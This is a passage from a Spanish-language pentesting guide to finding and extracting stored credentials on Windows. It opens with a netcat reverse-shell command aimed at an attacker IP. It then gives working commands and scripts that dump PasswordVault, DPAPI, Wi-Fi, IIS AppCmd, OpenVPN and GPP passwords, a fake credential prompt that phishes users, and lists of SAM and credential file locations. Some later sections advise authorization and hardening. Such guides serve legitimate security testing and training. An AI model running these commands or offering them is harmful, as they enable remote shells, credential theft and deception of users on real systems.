C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Ten en cuenta que puedes usar mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) o el módulo de Powershell de [Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Las aplicaciones UWP modernas de Windows, Microsoft Edge y los servicios modernos del sistema almacenan tokens de autenticación y contraseñas en texto sin cifrar dentro de `PasswordVault` de Universal Windows Platform (UWP) (también disponible como `Web Credentials` en `vaultcmd`). Este espacio de almacenamiento está aislado por sesión y se puede descifrar de forma nativa sin privilegios administrativos ni `SeDebugPrivilege`.

Ejecuta este comando de PowerShell dentro de la sesión activa del usuario para volcar y descifrar al instante todos los nombres de usuario y las contraseñas almacenadas en texto sin cifrar:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

La **API de protección de datos (DPAPI)** proporciona un método para el cifrado simétrico de datos, utilizado principalmente en el sistema operativo Windows para el cifrado simétrico de claves privadas asimétricas. Este cifrado aprovecha un secreto de usuario o del sistema para contribuir significativamente a la entropía.

**DPAPI permite cifrar claves mediante una clave simétrica derivada de los secretos de inicio de sesión del usuario**. En situaciones que implican el cifrado del sistema, utiliza los secretos de autenticación del dominio del sistema.

Las claves RSA de usuario cifradas mediante DPAPI se almacenan en el directorio `%APPDATA%\Microsoft\Protect\{SID}`, donde `{SID}` representa el [identificador de seguridad](https://en.wikipedia.org/wiki/Security_Identifier) del usuario. **La clave DPAPI, ubicada junto con la clave maestra que protege las claves privadas del usuario en el mismo archivo**, suele constar de 64 bytes de datos aleatorios. (Es importante tener en cuenta que el acceso a este directorio está restringido, lo que impide listar su contenido mediante el comando `dir` en CMD, aunque sí se puede listar mediante PowerShell).

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Puedes usar el **módulo de mimikatz** `dpapi::masterkey` con los argumentos apropiados (`/pvk` o `/rpc`) para descifrarla.

Los **archivos de credenciales protegidos por la contraseña maestra** suelen estar ubicados en:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Puedes usar el **módulo mimikatz** `dpapi::cred` con el `/masterkey` adecuado para descifrar.\
Puedes **extraer muchas** **masterkeys** de **la memoria** con el módulo `sekurlsa::dpapi` (si tienes root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Credenciales de PowerShell

Las **credenciales de PowerShell** se usan a menudo para **scripting** y tareas de automatización, como una forma práctica de almacenar credenciales cifradas. Las credenciales están protegidas mediante **DPAPI**, lo que normalmente significa que solo el mismo usuario, en el mismo equipo donde se crearon, puede descifrarlas.

Un archivo de credenciales exportado puede tener un nombre de archivo o una ruta `.xml` arbitrarios. Si un script o inventario de archivos señala uno, busca el directorio de perfil real de la cuenta en lugar de asumir que está en `C:\Users`: [Windows puede almacenar los perfiles en otras ubicaciones](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Que el archivo sea legible solo es una pista; [Windows `Export-Clixml` vincula una credencial cifrada al usuario y al equipo que la exportan](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), y cualquier cuenta recuperada debe tener por separado permisos válidos en el servicio previsto. Inspecciona primero las rutas y las ACL, sin mostrar valores cifrados ni en texto claro durante la enumeración rutinaria.

Para **descifrar** unas credenciales de PS desde el archivo que las contiene, puedes hacer lo siguiente:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Conexiones RDP guardadas

Puedes encontrarlas en `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
y en `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Comandos ejecutados recientemente

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Administrador de credenciales de Escritorio remoto**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Usa el módulo `dpapi::rdg` de **Mimikatz** con el `/masterkey` adecuado para **descifrar cualquier archivo .rdg**\
Puedes **extraer muchas DPAPI masterkeys** de la memoria con el módulo `sekurlsa::dpapi` de Mimikatz

**mRemoteNG usa un almacén de conexiones distinto.** Inspecciona los archivos XML legibles en `%APPDATA%\mRemoteNG` y en los Documentos del usuario, incluidos los archivos con nombres comunes, como `config.xml`. Identifica el esquema de conexiones y los atributos `Password` cifrados antes de considerar un archivo XML como posible fuente de credenciales. El valor almacenado no es una contraseña de DPAPI/RDCMan; su recuperación depende de la configuración de cifrado del archivo y de si se utilizó una contraseña maestra personalizada. Evita imprimir valores cifrados durante la enumeración general.

**Las exportaciones de perfiles de Remote Desktop Plus** también pueden ser legibles en directorios de usuario o en una carpeta de administración compartida. Una exportación antigua `profiles.xml` contiene entradas `Data/Profile` con elementos `ProfileName`, `Password` y `Secure`. Considera que un elemento de contraseña no vacío es un posible indicio de credenciales, pero no lo imprimas ni supongas que está en texto plano: [el proveedor indica](https://www.donkz.nl/) que la protección de perfiles puede estar vinculada a la cuenta y al equipo que los creó, o configurarse con menos restricciones. Confirma el origen del archivo y las condiciones de recuperación antes de confiar en él.

### Sticky Notes

A veces, las personas guardan contraseñas y otra información en aplicaciones de notas adhesivas. La aplicación Sticky Notes empaquetada de Microsoft suele almacenar las notas en `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`; las aplicaciones más antiguas o distintas pueden usar otros almacenes del perfil de usuario, incluido LevelDB. Identifica la aplicación instalada y el formato de almacenamiento antes de concluir que no hay notas porque no encuentras el archivo SQLite.

Si Sticky Notes usa el registro write-ahead de SQLite, una copia de `plum.sqlite` por sí sola puede omitir notas confirmadas recientemente. Conserva el archivo `plum.sqlite-wal` correspondiente junto con una copia coherente de la base de datos, e incluye `plum.sqlite-shm` si está disponible; el índice de memoria compartida se puede reconstruir, pero el WAL forma parte del estado persistente de la base de datos. Consulta la [documentación de WAL de SQLite](https://www.sqlite.org/wal.html). Una nota que contenga un nombre de cuenta o una contraseña es solo un posible indicio de credenciales: verifica por separado la cuenta, los permisos de acceso y la reutilización de la contraseña. Un registro cifrado de un gestor de contraseñas también requiere su clave de descifrado real y una interpretación específica de la aplicación antes de que pueda servir para confirmar un inicio de sesión con privilegios superiores.

### AppCmd.exe

**Ten en cuenta que, para recuperar contraseñas de AppCmd.exe, debes ser Administrador y ejecutarlo con un nivel de integridad alto.**\
**AppCmd.exe** se encuentra en el directorio `%systemroot%\system32\inetsrv\`.\
Si este archivo existe, es posible que se hayan configurado algunas **credenciales** y que puedan **recuperarse**.

Este código se extrajo de [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Comprueba si existe `C:\Windows\CCM\SCClient.exe`.\
Los instaladores se **ejecutan con privilegios de SYSTEM**; muchos son vulnerables a **DLL Sideloading (información de** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Archivos y registro (credenciales)

### Artefactos de credenciales en el registro de herramientas de soporte

Algunas instalaciones antiguas de soporte remoto conservan nombres de valores relacionados con contraseñas en claves fijas del registro de la aplicación. Por ejemplo, `SecurityPasswordAES` de TeamViewer identificaba una contraseña estática de sesión configurada en versiones anteriores a la 9, según la [explicación del proveedor sobre la clave del registro](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Un marcador en el nombre del valor es solo una pista para revisar: comprueba la versión instalada, si los datos del valor son legibles, su formato y el comportamiento actual de autenticación antes de evaluar esa credencial. Pasar de una contraseña de soporte remoto a una cuenta de Windows con más privilegios también requiere que la contraseña realmente se reutilice y que se tenga autorización para esa cuenta. Evita incluir texto cifrado y contraseñas recuperadas en la salida de la enumeración habitual.

### Hojas de cálculo compartidas con hojas protegidas

Si se sospecha que un libro compartido legible contiene datos de cuentas, distingue entre **cifrado de archivos** y protección de hojas de cálculo o columnas ocultas. [Microsoft indica](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) que la protección de hojas de cálculo controla la edición y no es una función de seguridad; por sí sola, no demuestra que el contenido del libro esté cifrado. Revisa solo los archivos pertinentes a los que tengas autorización de acceso y evita mostrar posibles secretos durante una enumeración amplia. Una ruta legible a un archivo `.xlsx`, una hoja protegida o una columna oculta no demuestra por sí sola que existan credenciales ni que alguna cuenta tenga más privilegios; verifica por separado los datos reales y los permisos actuales de la cuenta.

### Parches de cambios conservados por el servidor de CI

Un servidor de CI puede conservar los cambios de código fuente enviados en su directorio de datos incluso después de finalizar la compilación. [TeamCity documenta](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` como ubicación de almacenamiento de los cambios de ejecuciones remotas; el directorio de datos se puede configurar y no necesariamente está bajo `ProgramData`. Un parche legible puede conservar referencias eliminadas o añadidas a un archivo de credenciales, una clave de cifrado o un script que use ambos. Por ejemplo, un flujo de trabajo de PowerShell con `ConvertTo-SecureString -Key` requiere tanto la clave AES como la cadena cifrada; [Microsoft documenta](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) que la clave se proporciona por separado. Primero revisa solo los nombres de los parches accesibles y, después, inspecciona el contenido pertinente con autorización, sin mostrar secretos en la salida de la enumeración habitual. Una ruta a un parche, un valor cifrado o una referencia a una clave no demuestra por sí sola que haya una credencial válida ni acceso con más privilegios. Restringe las ACL del directorio de datos y evita incluir secretos en los cambios de compilación.

### Rotación personalizada de contraseñas de administrador local

Un rotador de contraseñas casero puede almacenar una contraseña cifrada de administrador local en un servicio local y guardar las credenciales de su datastore en un archivo `.env` legible o junto al binario del actualizador. Revisa en conjunto la tarea programada del actualizador, la cuenta, las ACL de la configuración, el listener y los permisos del datastore. Un datastore que solo escucha en loopback sigue siendo accesible para un usuario local que tenga credenciales válidas, pero la autenticación por sí sola no demuestra que tenga permiso para leer los registros pertinentes. Si la semilla de cifrado o el material de la clave están accesibles junto al texto cifrado, revisa el método exacto de derivación de claves antes de confiar en el cifrado. Un esquema que deriva determinísticamente una clave AES de una semilla expuesta usando Go [`math/rand`](https://pkg.go.dev/math/rand) no es adecuado para proteger esa contraseña; Go indica que ese paquete no es apropiado para generar valores aleatorios en contextos sensibles a la seguridad. Confirma que cualquier contraseña recuperada siga vigente y pertenezca a una cuenta del grupo Administradores local antes de considerarla una vía de escalada. Una tarea programada, una ruta a `.env` o un bloque cifrado no demuestran por sí solos ninguna de estas condiciones. Evita incluir contraseñas y material de claves en la salida de la enumeración habitual.

Usa [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) para administrar las contraseñas de administrador local. Su almacenamiento en el directorio o en Entra y sus controles de acceso son distintos de los de un datastore local personalizado; de igual forma, los [roles de Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) determinan si un usuario autenticado del datastore puede leer un índice específico.

### Archivos de plugins de servidor Java y reutilización de credenciales

Algunos plugins de servidor Java se distribuyen como archivos JAR en el directorio `plugins` de un servidor. Un plugin personalizado legible puede contener configuración o bytecode con una credencial de servicio incrustada. Revisa el archivo solo si tienes autorización y evita incluir secretos recuperados en la salida de la enumeración habitual. La ruta a un plugin no demuestra por sí sola que exista un secreto, y una contraseña de servicio recuperada solo da acceso a más privilegios si también es válida para una cuenta con más privilegios. Comprueba las ACL de los archivos pertinentes y sustituye las credenciales reutilizadas por secretos diferentes. Consulta la [guía de instalación de plugins de PaperMC](https://docs.papermc.io/paper/adding-plugins/) para conocer la estructura de directorios y la [documentación de JAR de Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) para saber qué contiene un archivo de este tipo.

### Credenciales de la base de datos integrada de Openfire

Una instalación de Openfire que usa su base de datos integrada puede guardar `openfire.script` en `Openfire\embedded-db`. Si la cuenta actual puede leerlo, revisa conjuntamente los registros `OFUSER` y la propiedad `passwordKey`. La [documentación de Openfire sobre proveedores de usuarios](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) indica que las contraseñas se pueden almacenar en texto sin formato o cifradas con una clave contenida en esa propiedad. Una contraseña recuperada solo sirve para escalar privilegios si sigue siendo válida para una identidad con más privilegios; el nombre del archivo no demuestra ni que se pueda leer ni que se reutilicen las credenciales. La ruta sirve como indicio para el inventario, así que evita incluir el contenido de la base de datos y las credenciales en la salida de la enumeración habitual.

El archivo independiente `Openfire\conf\openfire.xml` puede revelar los puertos configurados y la interfaz de enlace de la consola de administración, incluso si se utiliza una base de datos externa. Openfire suele enlazar la consola de administración a loopback; aun así, una cuenta local puede acceder a esa dirección si el listener está activo. Comprueba conjuntamente el listener real, el rol de administración autorizado, la política de carga de plugins y la identidad del servicio de Openfire. Un administrador que pueda instalar un plugin puede hacer que el código del plugin se ejecute en el contexto del servicio, que puede tener muchos privilegios si el servicio se ejecuta como LocalSystem. Una contraseña coincidente o una ruta de configuración legible no demuestran por sí solas el acceso a la consola de administración ni la ejecución de código. Consulta la [guía del proveedor sobre instalación y administración de plugins](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) y la [propiedad de la API para cargar plugins](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Configuración del servidor de gestión forense

Las configuraciones del servidor Velociraptor, que suelen llamarse `server.config.yaml`, pueden contener `CA.private_key` de la CA interna. Si un usuario con menos privilegios puede leer esa clave, podría emitir un certificado de cliente de API. Que esto dé acceso a más privilegios depende de los roles de usuario del servidor, de la posibilidad de acceder a la API y de la identidad con la que se ejecuta el servidor o el agente de destino. Una configuración de cliente contiene material diferente; encontrar una no demuestra que se tenga acceso a la CA del servidor. Algunas implementaciones mantienen sin conexión la clave privada de la CA, por lo que una configuración de servidor legible también podría no incluir la clave de firma.

En un servidor Windows, inspecciona las ACL de la configuración del **servidor** en su directorio de instalación y de cualquier copia de seguridad protegida. Una ubicación posible es `%ProgramFiles%\VelociraptorServer\server.config.yaml`; si difiere, usa la ruta configurada para el servicio. Confirma que la identidad actual puede leer el archivo y que `CA.private_key` está realmente presente. Evita mostrar la clave privada en los registros o en la salida de la enumeración. El flujo de trabajo `config api_client` del proveedor usa la clave de la CA para emitir un certificado de cliente, pero también se necesita un rol efectivo en el servidor; crear uno o modificarlo puede requerir acceso de escritura al datastore o reiniciar el servicio. Una identidad privilegiada ya existente en el servidor puede ofrecer una vía incluso si no se dispone de esos permisos de escritura. Las consultas a la API con permisos de ejecución se ejecutan en el contexto pertinente del servidor o agente, que puede tener muchos privilegios.

Protege la configuración del servidor y las copias de seguridad con ACL restrictivas, mantén sin conexión la clave de firma de la CA siempre que sea posible y limita los roles de la API y el acceso al listener. Consulta la [documentación de la API de Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) y las [recomendaciones sobre configuración de seguridad](https://docs.velociraptor.app/docs/deployment/security/).

### Credenciales de PuTTY

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY es un gestor de sesiones independiente. Su almacén nativo cifrado puede estar en `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, mientras que una copia de seguridad exportada de las sesiones puede llamarse `sessions-backup.dat` y estar guardada en otra ubicación. [SolarWinds' export guide](https://thwack.solarwinds.com/discussion/comment/115591) indica que las exportaciones están cifradas con contraseña y pueden contener sesiones, claves, scripts, etiquetas y relaciones; su [support forum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) identifica el almacén nativo. Comprueba primero los permisos de los archivos y las rutas. Encontrar cualquiera de estos archivos no revela su contraseña ni demuestra que alguna credencial guardada siga siendo válida o tenga privilegios más altos.

### Claves de host SSH de PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Claves SSH en el registro

Las claves privadas SSH pueden almacenarse en la clave del registro `HKCU\Software\OpenSSH\Agent\Keys`, así que deberías comprobar si hay algo interesante allí:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Si encuentras alguna entrada dentro de esa ruta, probablemente sea una clave SSH guardada. Está cifrada, pero se puede descifrar fácilmente con [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Encontrarás más información sobre esta técnica aquí: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Si el servicio `ssh-agent` no está en ejecución y quieres que se inicie automáticamente al arrancar, ejecuta:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Parece que esta técnica ya no es válida. Intenté crear algunas claves SSH, añadirlas con `ssh-add` e iniciar sesión en una máquina mediante SSH. El registro HKCU\Software\OpenSSH\Agent\Keys no existe y procmon no detectó el uso de `dpapi.dll` durante la autenticación mediante claves asimétricas.

### Archivos desatendidos

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

También puedes buscar estos archivos usando **metasploit**: _post/windows/gather/enum_unattend_

Contenido de ejemplo:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Copias de seguridad de SAM y SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Los archivos de backup de Windows Imaging (`.wim`) legibles también pueden contener hives `SAM`, `SECURITY` y `SYSTEM` sin conexión. Prioriza los directorios de backup o imagen accesibles localmente e inspecciona los **nombres de los miembros** de una imagen antes de extraer nada; el nombre de archivo `.wim` por sí solo no demuestra que las hives estén expuestas, y las imágenes habituales `install.wim`, `boot.wim` y de recuperación suelen ser falsos positivos. Un recurso compartido SMB es una vía de acceso distinta y solo debe comprobarse si está dentro del alcance. Consulta la [guía de imágenes de Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) y la [referencia de archivos de hives del registro](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) de Microsoft.

### Credenciales en la nube

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Busca un archivo llamado **SiteList.xml**

### Contraseña de GPP almacenada en caché

Anteriormente había una función que permitía implementar cuentas de administrador local personalizadas en un grupo de máquinas mediante Group Policy Preferences (GPP). Sin embargo, este método tenía importantes fallos de seguridad. En primer lugar, cualquier usuario del dominio podía acceder a los objetos de directiva de grupo (GPO), almacenados como archivos XML en SYSVOL. En segundo lugar, cualquier usuario autenticado podía descifrar las contraseñas de estas GPP, cifradas con AES256 mediante una clave predeterminada documentada públicamente. Esto suponía un riesgo grave, ya que podía permitir que los usuarios obtuvieran privilegios elevados.

Para mitigar este riesgo, se desarrolló una función que busca archivos GPP almacenados localmente en caché que contengan un campo "cpassword" no vacío. Cuando encuentra uno, la función descifra la contraseña y devuelve un objeto personalizado de PowerShell. Este objeto incluye detalles sobre la GPP y la ubicación del archivo, lo que facilita identificar y corregir esta vulnerabilidad de seguridad.

Busca estos archivos en `C:\ProgramData\Microsoft\Group Policy\history` o en _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (anterior a W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Para descifrar el cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Usando crackmapexec para obtener las contraseñas:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Ejemplo de web.config con credenciales:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Archivos de respaldo en un webroot de IIS

Un respaldo ZIP antiguo colocado directamente en un webroot servido puede exponer archivos de configuración anteriores y credenciales reutilizables. Comprueba la ruta física configurada del sitio y si el archivo realmente es accesible por HTTP antes de considerarlo una exposición. La ruta predeterminada `C:\inetpub\wwwroot` es solo una posibilidad. Un inventario local rápido puede mostrar nombres y tamaños sin abrir los archivos:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

El nombre de un archivo comprimido no demuestra que contenga un secreto ni que una credencial recuperada otorgue privilegios superiores.

### Credenciales de OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Registros

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Solicitar credenciales

Siempre puedes **pedirle al usuario que introduzca sus credenciales o incluso las credenciales de otro usuario** si crees que puede conocerlas (ten en cuenta que **pedirle** directamente al cliente las **credenciales** es realmente **arriesgado**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Posibles nombres de archivo que contienen credenciales**

Archivos conocidos que hace algún tiempo contenían **contraseñas** en **texto claro** o **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

